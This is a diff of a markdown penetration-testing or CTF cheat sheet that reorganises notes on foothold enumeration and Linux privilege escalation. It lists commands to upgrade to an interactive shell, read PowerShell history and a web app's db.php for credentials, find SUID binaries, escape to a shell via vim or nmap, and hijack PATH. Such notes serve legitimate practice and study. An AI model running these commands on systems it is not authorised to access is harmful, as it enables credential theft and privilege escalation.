@@ -38,26 +38,60 @@ scp {path to linenum} {user}@{host}:{path} #Example: scp /opt/LinEnum.sh pingu@1
 
 
 
-## Privelege Escalation
+## Foothold Enumeration
 
-##### sudo-able commands
+###### getting an interactive shell
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+```bash
+SHELL=/bin/bash script -q /dev/null
+Ctrl-Z
+stty raw -echo
+fg
+reset
+xterm
+```
+##### always check what kind of user you landed on
+```bash
+whoami
+id
+```
+
+##### check files of user (and group) you landed on
+
+```bash
+find / -type f {-group/-user} {group/user} 2>/dev/null
+```
+
+##### check console history of windows terminal
+
+```bash
+type C:\Users\{user}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+##### if from www-data, check db credentials
+```bash
+cat /var/www/html/cdn-cgi/login/db.php
+```
+
+##### check sudo-able commands
 ```bash
 sudo -l
 ```
-##### root processes
+##### check root processes
 ```bash
 find / -perm +6000 2>/dev/null | grep '/bin/'
-```
-
-###### getting a terminal (if python is working)
-```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ###### pivoting to other users (if you have password)
 ```bash
 su {user name}
 ```
+
+
+
+## Privelege Escalation 
 
 ###### running bash in vim (if vim is runnable)
 ```
@@ -68,6 +102,11 @@ su {user name}
 ```
 nmap --interactive
 !sh
+```
+
+##### changing PATH
+```bash
+export PATH=/tmp:$PATH
 ```
 
 ## Misc
